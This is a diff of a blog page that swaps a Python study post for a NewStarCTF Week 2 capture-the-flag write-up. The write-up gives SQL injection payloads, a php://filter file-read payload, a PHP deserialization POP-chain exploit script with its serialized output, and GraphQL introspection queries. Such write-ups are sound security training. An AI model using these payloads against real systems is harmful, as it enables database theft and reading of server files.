@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/02/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/07/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/10/02/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/" class="post-title-link" itemprop="url">Python学习(二)</a>
+          <a href="/2022/10/07/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/" class="post-title-link" itemprop="url">NewStarCTF 公开赛赛道 WEEK2 WP</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-10-02 21:15:00" itemprop="dateCreated datePublished" datetime="2022-10-02T21:15:00+08:00">2022-10-02</time>
+      <time title="创建时间：2022-10-07 22:14:40" itemprop="dateCreated datePublished" datetime="2022-10-07T22:14:40+08:00">2022-10-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -247,12 +247,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">编程语言学习</span></a>
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
         </span>
     </span>
 
   
-    <span id="/2022/10/02/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/" class="post-meta-item leancloud_visitors" data-flag-title="Python学习(二)" title="阅读次数">
+    <span id="/2022/10/07/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/" class="post-meta-item leancloud_visitors" data-flag-title="NewStarCTF 公开赛赛道 WEEK2 WP" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>3.9k</span>
+      <span>3.5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>3 分钟</span>
     </span>
 </div>
 
@@ -283,447 +283,125 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
-<li>python数据容器<ul>
-<li>数据容器入门</li>
-<li>数据容器：list（列表）</li>
-<li>list的遍历</li>
-<li>数据容器：tuple（元组）</li>
-<li>数据容器：str（字符串）</li>
-<li>数据容器的切片</li>
-<li>数据容器：set（集合）</li>
-<li>数据容器：dict（字典、映射）</li>
-<li>数据容器的通用操作</li>
-</ul>
-</li>
-<li>python函数进阶<ul>
-<li>函数的多返回值</li>
-<li>函数的多种传参方式</li>
-<li>匿名函数</li>
-</ul>
-</li>
-<li>python的文件操作<ul>
-<li>文件的编码</li>
-<li>文件的读取</li>
-<li>文件的写入</li>
-<li>文件的追加</li>
-</ul>
-</li>
-</ul>
-<h2 id="python数据容器"><a href="#python数据容器" class="headerlink" title="python数据容器"></a>python数据容器</h2><h4 id="数据容器入门"><a href="#数据容器入门" class="headerlink" title="数据容器入门"></a>数据容器入门</h4><ul>
-<li>python数据类型：一种可以容纳多份数据的数据类型，容纳的每一份数据称之为1个元素，每一个元素，可以是任意类型的数据，如字符串、数字、布尔等。</li>
-<li>数据容器根据特点的不同进行分类<ul>
-<li>是否支持重复元素</li>
-<li>是否可以修改</li>
-<li>是否有序</li>
-</ul>
-</li>
-<li>数据容器的五类：<ul>
-<li>列表（list）、元组（tuple）、字符串（str）、集合（set）、字典（dict）</li>
-</ul>
-</li>
-</ul>
-<h4 id="数据容器：list（列表）"><a href="#数据容器：list（列表）" class="headerlink" title="数据容器：list（列表）"></a>数据容器：list（列表）</h4><ul>
-<li>列表的定义<ul>
-<li>列表内的每一个数据，称之为元素</li>
-<li>以<code>[]</code>作为标识</li>
-<li>列表内每一个元素之间用<code>,</code>隔开</li>
-<li>列表可以一个存储多个数据，且可以为不同的数据类型，支持嵌套。</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-168-1024x546.png"></p>
-<ul>
-<li>列表的下标索引</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-170-1024x542.png"><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-171-1024x543.png"></p>
-<ul>
-<li>列表的常用操作方法<ul>
-<li><p>方法和函数功能一样，有传入参数，有返回值，只是方法的使用格式不同</p>
-<ul>
-<li>方法的使用：student &#x3D; Student()<br>num &#x3D; student.add(1, 2)</li>
-</ul>
-</li>
-<li><p>列表的查询功能</p>
-<ul>
-<li>功能：查找指定元素在列表中的下标，如果找不到，会报错ValueError<ul>
-<li>语法：列表.index(元素)，index就是列表对象（变量）内置的方法（函数）</li>
-</ul>
-</li>
-<li>功能：统计某元素在列表中的数量<ul>
-<li>语法：列表.count(元素)</li>
-</ul>
-</li>
-<li>功能：统计列表内，有多少元素<ul>
-<li>语法：len(列表)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>列表的修改功能</p>
-<ul>
-<li>功能：修改特点位置（索引）的元素值<ul>
-<li>语法：列表[下标] &#x3D; 值</li>
-</ul>
-</li>
-<li>功能：插入元素<ul>
-<li>语法：列表.insert(下标,元素)，在指定的下标位置，插入指定的元素</li>
-</ul>
-</li>
-<li>功能：追加单个元素<ul>
-<li>语法：列表.append(元素)，将指定元素，追加到列表的尾部</li>
-</ul>
-</li>
-<li>功能：追加一批元素<ul>
-<li>语法：列表.extend(其他数据容器)，将其他数据容器的内容取出，依次追加到列表尾部</li>
-</ul>
-</li>
-<li>功能：元素的删除<ul>
-<li>语法1：del 列表[下标]</li>
-<li>语法2：列表.pop(下标)</li>
-</ul>
-</li>
-<li>功能：删除某元素在列表中的第一个匹配值<ul>
-<li>语法：列表.remove(元素)</li>
-</ul>
-</li>
-<li>功能：清空列表内容<ul>
-<li>语法：列表.clear()</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-172-1024x543.png"><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-173-1024x543.png"><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-174-1024x542.png"></p>
-<ul>
-<li>列表的特点<ul>
-<li>可以容纳多个元素</li>
-<li>可以容纳不同类型的元素</li>
-<li>数据是有序存储的（有下标序号）</li>
-<li>允许重复数据存在</li>
-<li>可以修改（增加或删除元素等）</li>
-</ul>
-</li>
-</ul>
-<h4 id="list的遍历"><a href="#list的遍历" class="headerlink" title="list的遍历"></a>list的遍历</h4><ul>
-<li>使用while循环对列表进行遍历</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-175-1024x543.png"></p>
-<ul>
-<li>使用for循环来遍历列表</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-176-1024x543.png"></p>
-<h4 id="数据容器：tuple（元组）"><a href="#数据容器：tuple（元组）" class="headerlink" title="数据容器：tuple（元组）"></a>数据容器：tuple（元组）</h4><ul>
-<li>元组一旦定义完成，就不可以被修改</li>
-<li>使用小括号定义变量</li>
-<li>元组定义单个元素的时候，后面需要加上一个括号</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-1-1024x543.png"></p>
-<ul>
-<li>index()：查找某个元素，如果数据存在返回对应的下标，否则报错</li>
-<li>count()：统计某个数据在当前元组出现的次数</li>
-<li>len(元组)：统计元组内的元素个数</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-2-1024x542.png"></p>
-<ul>
-<li>元组的遍历：while</li>
-<li>元组的遍历：for</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-3-1024x541.png"></p>
-<ul>
-<li>注意事项<ul>
-<li>不可以修改元素的内容，否则会报错</li>
-<li>可以修改元组内的list的内容（修改元素、增加、删除、反转等）</li>
-</ul>
-</li>
-</ul>
-<h4 id="数据容器：str（字符串）"><a href="#数据容器：str（字符串）" class="headerlink" title="数据容器：str（字符串）"></a>数据容器：str（字符串）</h4><ul>
-<li>字符串也是支持下标索引的</li>
-<li>字符串是无法修改的数据容器</li>
-<li>index()：与前面的index是一样的</li>
-<li>字符串的替换<ul>
-<li>语法：字符串.replace(字符串1,字符串2)</li>
-<li>功能：将字符串内的全部：字符串1替换为字符串2</li>
-<li>注意：不是修改字符串本身，而是得到一个新字符串</li>
-</ul>
-</li>
-<li>字符串的切割<ul>
-<li>语法：字符串.split(分隔符字符串)</li>
-<li>功能：按照指定的分隔符字符串，将字符串划分为多个字符串，并存入列表对象中</li>
-<li>注意：字符串本身不变，而是得到了一个列表对象</li>
-</ul>
-</li>
-<li>字符串的规整操作（去前后指定字符串）<ul>
-<li>语法：字符串.strip(字符串)</li>
-<li>不传入参数默认去掉首尾空格</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-4-1024x542.png"></p>
-<ul>
-<li>统计字符串中某字符出现的次数：count()</li>
-<li>字符串的长度：len()</li>
-<li>遍历字符串：跟上面的一样</li>
-</ul>
-<h4 id="数据容器的切片"><a href="#数据容器的切片" class="headerlink" title="数据容器的切片"></a>数据容器的切片</h4><ul>
-<li>序列：内容连续、有序、可使用下标索引的一类数据容器</li>
-<li>列表、元组、字符串都可以视为序列</li>
-<li>切片：<ul>
-<li>概念：从一个序列中，取出来一个子序列</li>
-<li>语法：序列[起始下标:结束下标:步长]</li>
-<li>表示从序列中，从指定位置开始，依次取出元素，到指定位置结束，得到一个新序列</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-51-1024x540.png"></p>
-<h4 id="数据容器：set（集合）"><a href="#数据容器：set（集合）" class="headerlink" title="数据容器：set（集合）"></a>数据容器：set（集合）</h4><ul>
-<li><p>集合最大的特点结束不支持重复元素，并且内容是无序的</p>
-</li>
-<li><p>语法：使用<code>&#123;&#125;</code></p>
-</li>
-<li><p>集合的常用操作-修改</p>
-<ul>
-<li>集合是无序的，所以集合不支持下标索引访问，但是集合和列表一样，是允许被修改的</li>
-<li>添加新元素<ul>
-<li>add：集合.add(元素)</li>
-</ul>
-</li>
-<li>移除元素<ul>
-<li>remove：集合.remove(元素)</li>
-</ul>
-</li>
-<li>从集合中随机取出元素<ul>
-<li>pop：集合.pop()</li>
-<li>结果：会得到一个元素的结果，同时集合本身被修改，元素被移除。</li>
-</ul>
-</li>
-<li>清空元素<ul>
-<li>clear：集合.clear()</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>集合的常用操作</p>
-<ul>
-<li>取出两个集合的差集<ul>
-<li>语法：集合1.difference(集合2)</li>
-<li>功能：取出集合1和集合2的差集（集合1有而集合2没有的）</li>
-<li>结果：得到一个新集合，集合1和集合2不变</li>
-</ul>
-</li>
-<li>消除两个集合的差集<ul>
-<li>语法：集合1.difference_update(集合2)</li>
-<li>功能：对比集合1和集合2，在集合1内，删除和集合2相同的元素</li>
-<li>结果：集合1被修改，集合2不变</li>
-</ul>
-</li>
-<li>两个集合合并<ul>
-<li>集合.union(集合2)</li>
-<li>功能：将集合1和集合2组合成新集合</li>
-<li>结果：得到新集合，集合1和集合2不变</li>
-</ul>
-</li>
-<li>统计集合元素数量len<ul>
-<li>len(集合)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>遍历</p>
-<ul>
-<li>集合不支持下标索引，不能使用while循环</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-52-1024x539.png"></p>
-<h4 id="数据容器：dict（字典、映射）"><a href="#数据容器：dict（字典、映射）" class="headerlink" title="数据容器：dict（字典、映射）"></a>数据容器：dict（字典、映射）</h4><ul>
-<li>字典的定义<ul>
-<li>可以使用字典，实现用key取出value的操作</li>
-<li>定义：使用<code>&#123;&#125;</code>，不过存储的元素是一个个的<code>键值对</code>，dict也可以定义</li>
-<li>不可以使用下标索引，通过key值去得到value值</li>
-<li>字典的key和value可以是任意数据类型（key不可以为字典）</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-54-1024x539.png"></p>
-<ul>
-<li>字典的常用操作<ul>
-<li>新增元素<ul>
-<li>语法：字典[key]&#x3D;value</li>
-<li>结果：字典被修改，新增了元素</li>
-</ul>
-</li>
-<li>更新元素<ul>
-<li>语法：字典[key]&#x3D;value</li>
-<li>结果：字典被修改，元素被更新</li>
-<li>注意：字典key不可以重复，所以对已存在的key进行上述操作，就是更新value的值</li>
-</ul>
-</li>
-<li>删除元素<ul>
-<li>语法：字典.pop(key)</li>
-<li>结果：获取指定key的value，同时字典被修改，指定key的数据被删除</li>
-</ul>
-</li>
-<li>清空元素<ul>
-<li>字典.clear()</li>
-</ul>
-</li>
-<li>获取全部key<ul>
-<li>语法：字典.keys()</li>
-<li>结果：得到字典中的全部key</li>
-</ul>
-</li>
-<li>获取字典的元素数量<ul>
-<li>len()</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-56-1024x544.png"></p>
-<ul>
-<li>字典的特点总结：<ol>
-<li>可以容纳多个数据</li>
-<li>可以容纳不同类型的数据</li>
-<li>每一份数据都是key-value的键值对</li>
-<li>可以通过key获取value，key不可重复（重复会覆盖）</li>
-<li>不支持下标索引</li>
-<li>可以修改（增加或删除更新元素）</li>
-</ol>
-</li>
-</ul>
-<h4 id="数据容器的通用操作"><a href="#数据容器的通用操作" class="headerlink" title="数据容器的通用操作"></a>数据容器的通用操作</h4><ul>
-<li>遍历上：<ul>
-<li>五类数据容器都支持for循环</li>
-<li>只有列表、元组、字符串支持while循环，集合、字典不支持</li>
-</ul>
-</li>
-<li>len(容器)</li>
-<li>max(容器)：最大元素</li>
-<li>min(容器)：最小函数</li>
-<li>容器的通用转换功能<ul>
-<li>list(容器)：将给定容器转换为列表</li>
-<li>str(容器)：将给定容器转换为字符串</li>
-<li>tuple(容器)：将给定容器转换为元组</li>
-<li>set(容器)：将给定容器转换为集合</li>
-</ul>
-</li>
-<li>容器通用排序<ul>
-<li>sorted(容器,[reverse&#x3D;True])：将给定容器进行排序</li>
-<li>reverse表示反转</li>
-<li>排序的结果会变成列表对象</li>
-</ul>
-</li>
-</ul>
-<h2 id="python函数进阶"><a href="#python函数进阶" class="headerlink" title="python函数进阶"></a>python函数进阶</h2><h4 id="函数的多返回值"><a href="#函数的多返回值" class="headerlink" title="函数的多返回值"></a>函数的多返回值</h4><ul>
-<li>函数的多返回值的数据类型没有要求</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-57-1024x539.png"></p>
-<h4 id="函数的多种传参方式"><a href="#函数的多种传参方式" class="headerlink" title="函数的多种传参方式"></a>函数的多种传参方式</h4><ul>
-<li>函数参数种类<ul>
-<li>位置参数：<ul>
-<li>调用函数时根据函数定义的参数位置来传递参数</li>
-<li>注意：顺序和个数必须一致</li>
-</ul>
-</li>
-<li>关键字参数：<ul>
-<li>函数调用时通过<code>键=值</code>的方式传参</li>
-<li>函数调用时，如果有位置参数时，位置参数必须在关键字参数的前面，但关键字参数之间不存在先后顺序</li>
-</ul>
-</li>
-<li>缺省参数：<ul>
-<li>也叫默认参数，用于定义函数，为参数提供默认值，调用时可以不传则会以默认值传入</li>
-<li>设置默认值的参数必须放在后面</li>
-</ul>
-</li>
-<li>不定长参数：<ul>
-<li>也叫可变参数，用于不确定调用的时候会传递多少个参数（不传参也可以）</li>
-<li>不定长参数的类型<ul>
-<li>位置传递：使用<code>*</code></li>
-<li>关键字传递：使用<code>**</code></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-58-1024x539.png"></p>
-<h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><ul>
-<li>函数作为参数传递<ul>
-<li>将函数自身传递到其他函数内</li>
-<li>函数传入的作用：传入计算逻辑，而非传入数据</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-59-1024x543.png"></p>
-<ul>
-<li>lambda匿名函数<ul>
-<li>函数定义的类型：<ul>
-<li>def关键字，定义带有名称的函数，可以重复使用</li>
-<li>lambda关键字，可以定义匿名的函数（无名称），只可以临时使用一次</li>
-</ul>
-</li>
-<li>匿名函数的定义语法：<ul>
-<li>lambda 传入参数:函数体(一行代码)</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-60-1024x548.png"></p>
-<h2 id="python的文件操作"><a href="#python的文件操作" class="headerlink" title="python的文件操作"></a>python的文件操作</h2><h4 id="文件的编码"><a href="#文件的编码" class="headerlink" title="文件的编码"></a>文件的编码</h4><ul>
-<li>常用的编码：UTF-8、GBK</li>
-</ul>
-<h4 id="文件的读取"><a href="#文件的读取" class="headerlink" title="文件的读取"></a>文件的读取</h4><ul>
-<li>文件的操作主要包括打开、关闭、读、写等操作</li>
-<li>打开文件：open(name,mode,encoding)<ul>
-<li>name：是要打开的目标文件的字符串（可以包含文件所在的具体路径）</li>
-<li>mode：设置打开文件的模式（访问模式）：只读<code>(r)</code>、写入<code>(w)</code>、追加<code>(a)</code>等</li>
-<li>encoding：编码格式</li>
-</ul>
-</li>
-<li>读操作相关方法<ul>
-<li>read()方法：文件对象.read(num)<ul>
-<li>num表示要从文件中读取的数据的长度（单位是字节），如果没有传入num，那么就表示读取文件中所有的数据。</li>
-</ul>
-</li>
-<li>readlines()方法：<ul>
-<li>读取多行内容</li>
-<li>可以按照行的方式把整个文件中的内容进行一次性读取，并且返回的是一个<code>列表</code>，其中每一行的数据为一个元素</li>
-</ul>
-</li>
-<li>readline()方法<ul>
-<li>一次读取一行内容</li>
-</ul>
-</li>
-<li>for循环读取文件行</li>
-<li>close()：关闭文件对象</li>
-<li>with open语法：自动完成对文件的close</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-61-1024x543.png"></p>
-<h4 id="文件的写入"><a href="#文件的写入" class="headerlink" title="文件的写入"></a>文件的写入</h4><ul>
-<li>write()：文件写入</li>
-<li>flush()：内容刷新</li>
-<li>注意：<ul>
-<li>w模式，文件不存在，会创建新文件</li>
-<li>w模式，文件存在，会清空原有文件</li>
-<li>close()方法，带有flush()方法的功能</li>
-</ul>
-</li>
-</ul>
-<h4 id="文件的追加"><a href="#文件的追加" class="headerlink" title="文件的追加"></a>文件的追加</h4><ul>
-<li>模式替换为a</li>
-<li>文件存在会追加</li>
-<li>文件不存在会创建文件</li>
-<li>可以使用”\n”来写入换行符</li>
-</ul>
-<p>第二部分学完了，继续加油……</p>
-<p>如果文章有何不妥之处，请您指出。持续更新中……</p>
+          <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="Word-For-You-2-Gen"><a href="#Word-For-You-2-Gen" class="headerlink" title="Word-For-You(2 Gen)"></a>Word-For-You(2 Gen)</h4><p>这道题目做的时候，以为是布尔盲注，然后写脚本一直跑，就是得不到flag，好家伙…………因为他这道题没必要使用布尔盲注，想哭……</p>
+<p>这道题直接使用报错注入就可以了。使用<code>1’ union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,database()),&#39;b&#39;)#</code>可以得到库名</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-30.png"></p>
+<p>直接burp发到重发器来注入，然后我们使用<code>1&#39; union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),&#39;b&#39;)#</code>可以分别得到三个表名<code>wfy_admin</code>、<code>wfy_comments</code>、<code>wfy_information</code></p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-31.png"></p>
+<p>然后使用<code>1&#39; union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;wfy_comments&#39; limit 0,1)),&#39;b&#39;)#</code><br>可以得到字段<code>id</code>、<code>text</code>、<code>user</code>、<code>name</code>、<code>display</code></p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-32.png"></p>
+<p>最后使用<code>1&#39; union select updatexml(&#39;a&#39;,concat(&#39;~&#39;,(select concat(text,user,name,display) from wfy_comments limit 11,1)),&#39;b&#39;)#</code>可以得到flag</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-33.png"></p>
+<h4 id="IncludeOne"><a href="#IncludeOne" class="headerlink" title="IncludeOne"></a><strong>IncludeOne</strong></h4><p>这道题目提示了我们使用随机数是不是真的随机，所以可能是要使用php_mt_seed这个工具进行破解了。</p>
+<p>题目给出了源码，而且还给出了一个随机数的值。所以我们使用php_mt_seed查看其种子的值。</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-34.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-35.png"></p>
+<p>这里的值是我一个个试出来的，没有想到好的方法得到PHP的版本。然后我们得到种子之后就可以利用种子来绕过第一个if了。</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-36.png"></p>
+<p>第二个if两个正则表达式，这里我们可以使用到伪协议了，但是因为base被过滤了，所以我们可以使rot13来代替，但是要包含NewStar，所以这里要介绍一个伪协议的特性了，过滤器是可以随便写的，所以这个字符串可以放在过滤器中，构造payload：<code>?file=php://filter/read=string.rot13|NewStar/resource=flag.php</code><br>结合起来就可以得到flag了</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-37.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-38.png"></p>
+<p>进行rot13解密即可得到flag。</p>
+<h4 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h4><p>搞了四天，终于把反序列化搞懂了一点点，之前的反序列化题目白做了，题目给出了源码</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-39.png"></p>
+<p>利用点在Sec类中的__invoke魔术方法中，所以我们要触发这个方法就需要Start类中的__isset魔术方法，再触发这个方法我们就需要eeee类中的__clone魔术方法，触发这个方法需要Easy类中的__call方法，触发__call我们可以访问Easy类中不存在。所以我们的pop链为</p>
+<blockquote>
+<p>Easy:__call-&gt;eeee:__clone-&gt;Start:__isset-&gt;Sec:__invoke，但是反序列化会先执行__destruct魔术方法，所以我们最后的pop链为</p>
+<p>Start:__destruct-&gt;Sec:__toString-&gt;Easy:__call-&gt;eeee:__clone-&gt;Start:__isset-&gt;Sec:__invoke</p>
+</blockquote>
+<p>最后代码如下：</p>
+<pre><code>&lt;?php
+
+class Start
+&#123;
+    public $name;
+    public $func;
+
+    public function __destruct()
+    &#123;
+        echo &quot;Welcome to NewStarCTF, &quot; . $this-&gt;name;
+    &#125;
+
+    public function __isset($var)
+    &#123;
+        ($this-&gt;func)();
+    &#125;
+&#125;
+
+class Sec
+&#123;
+    public $obj;
+    public $var;
+
+    public function __toString()
+    &#123;
+        $this-&gt;obj-&gt;check($this-&gt;var);
+        return &quot;CTFers&quot;;
+    &#125;
+
+    public function __invoke()// 利用点
+    &#123;
+        echo file_get_contents(&#39;flag.txt&#39;);
+    &#125;
+&#125;
+
+class Easy
+&#123;
+    public $cla;
+
+    public function __call($fun, $var)
+    &#123;
+        $this-&gt;cla = clone $var[0];
+    &#125;
+&#125;
+
+class eeee
+&#123;
+    public $obj;
+
+    public function __clone()
+    &#123;
+        if (isset($this-&gt;obj-&gt;cmd)) &#123;
+            echo &quot;success&quot;;
+        &#125;
+    &#125;
+&#125;
+
+$a = new Easy();
+$b = new eeee();
+$c = new Start();
+$d = new Sec();
+$b-&gt;obj = $c;
+$c-&gt;func = $d;
+$c-&gt;name = $d;
+$d-&gt;obj = $a;
+$d-&gt;var = $b;
+$a-&gt;callxxx($b);
+echo serialize($a);
+</code></pre>
+<p>得出序列化的结果为：<code>O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;r:1;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;r:3;&#125;&#125;s:4:&quot;func&quot;;r:4;&#125;&#125;&#125;</code></p>
+<p>最后可以得到flag</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-40.png"></p>
+<h4 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a><strong>ezAPI</strong></h4><p>源码泄露，访问<a target="_blank" rel="noopener" href="http://www.zip得到源码/">www.zip得到源码</a></p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-41.png"></p>
+<p>这里是后面提示了才知道是GraphQL，所以还去学习了一下GraphQL的基本语法，首先使用<code>id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\n __schema &#123;\n types &#123;\n name \n &#125;\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;</code>得到flag所在的位置</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-42.png"></p>
+<p>最后使用<code>id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag &#123;flag&#125;&#125;&quot;,&quot;variables&quot;:null&#125;</code>得到flag</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-43.png"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Yesec-no-drumsticks-2"><a href="#Yesec-no-drumsticks-2" class="headerlink" title="Yesec no drumsticks 2"></a><strong>Yesec no drumsticks 2</strong></h4><p>提示是使用vim打开</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-44.png"></p>
+<p>这是零宽度字符隐写，使用工具提取隐写的内容：<br><em><a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></em></p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-45.png"></p>
+<p>得到隐写内容之后进行解码，一直以为是base64编码，后来才试出来是base58编码</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-46.png"></p>
+<p>再将十六进制转换为字符串即可得到flag</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-47.png"></p>
